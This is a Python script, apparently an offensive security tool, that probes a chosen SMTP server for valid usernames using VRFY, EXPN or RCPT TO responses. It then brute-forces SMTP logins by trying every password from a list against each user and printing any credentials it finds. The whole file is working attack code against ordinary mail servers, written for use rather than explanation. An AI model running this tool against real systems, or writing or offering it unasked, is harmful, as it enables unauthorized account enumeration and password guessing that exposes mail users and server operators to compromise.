import smtplib
import argparse
import base64

parser = argparse.ArgumentParser(description='Enum SMTP users using VRFY')

parser.add_argument('--ssl', action='store_true')
parser.add_argument('-u', required=True, help='Path to file with usernames to test', metavar='file')
parser.add_argument('--ip', required=True, help='IP or domain of SMTP server')
parser.add_argument('--port', required=False, help='Port')
parser.add_argument('--local_hostname', required=False, help='Send this as identifier during HELLO\\EHLO')
parser.add_argument('-v', required=False, help='Verbose', action='store_true')
parser.add_argument('--domain', required=False, help='Add this domain to each username in list')
parser.add_argument('--user_enum', required=False, help='User enumeration mode', action='store_true')
parser.add_argument('-p', required=False, help='File with password to try')
args = parser.parse_args()

smtp = smtplib.SMTP_SSL if args.ssl else smtplib.SMTP
port = args.port if args.port else (465 if args.ssl else 25)
local_hostname = args.local_hostname if args.local_hostname else 'smtp.example.com'

try:
    with open(args.u, 'r') as f:
        users = [u.strip() for u in f.readlines()]
except FileNotFoundError:
    print(f'File {args.u} not found !')
    exit(-1)


def find_enum_methods(smtp_obj):
    with open(args.u, 'r') as f:
        test_user = f.readline().strip()
    if args.domain:
        test_user = f'{test_user}@{args.domain}'
    vrfy_resp = smtp_obj.vrfy(test_user)
    vrfy = False if (vrfy_resp[0] == 502 or vrfy_resp[0] == 503) else True
    if args.v:
        print(f'Testing VRFY against {args.ip}\nResponse {vrfy_resp}')
    if not vrfy:
        print(f'VRFY is disallowed on {args.ip}')
    expn_resp = smtp_obj.docmd('EXPN', test_user)
    expn = False if( expn_resp[0] == 502  or expn_resp[0] == 503) else True
    if args.v:
        print(f'Testing EXPN against {args.ip}\nResplonse {expn_resp}')
    if not expn:    
        print(f'EXPN is disallowed on {args.ip}')
    if vrfy:
        return smtp_obj.vrfy
    if expn:
        return lambda user, command='EXPN': smtp_obj.docmd(command, user) 
    return False
    
def enum_users():
    valid_accounts = []
    with smtp(args.ip, port, local_hostname=local_hostname) as s:
         s.ehlo_or_helo_if_needed()
         enum_fun = find_enum_methods(s) 
         with open(args.u) as f:
             users = [u.strip() for u in f.readlines()]
         if args.domain:
             users = [f'{u}@{args.domain}' for u in users]
         if not enum_fun:
             print('Trying to enum using MAIL\\RCPT TO')
             mail_from_email = 'MAIL FROM:test@test.org'
             resp = s.docmd(mail_from_email)
             if args.v:
                 print(mail_from_email, resp)
             for u in users:
                 resp = s.docmd(f'RCPT TO:{u}')
                 if resp[0] == 250:
                     valid_accounts.append(u)
                     print(f'[+] Valid user found {u}')
                 if args.v:
                     print(f'Response for {u}', resp)
         else:
             for u in users:
                 resp = enum_fun(u)
                 if args.v:
                     print(resp)
                 if resp[0] == 220:
                     valid_accounts.append(u)
                     print(f'[+] Valid user found for {args.ip}: {u}')  
    return valid_accounts

valid_accounts = []
if args.user_enum:
    print('Starting users enumeration')
    valid_accounts = enum_users()

if args.p:
    print(f'Starting brute account brute force')
    if valid_accounts:
        print(f'Using found valid accounts {valid_accounts}')
        users = valid_accounts
    else:
        print(f'Using users from file {args.u}')
    try:
        with open(args.p) as f:
            passwords = [p.strip() for p in f.readlines()]
    except FileNotFoundError:
        print(f'Password file {args.p} not found !')
        exit(-2)
    
    with smtp(args.ip, port, local_hostname=local_hostname) as s:
        for u in users:
            for p in passwords:
                try:
                    if args.v:
                        print(f'Trying {u}:{p} against {args.ip}')
                    resp = s.login(u, p)
                    print(f'[+] Found credentials {u}:{p}')
                    if args.v:
                        print(resp)
                    break
                except smtplib.SMTPAuthenticationError:
                    continue


if not args.p and not args.user_enum:
    print('No actions performed, specify -p or --user_enum')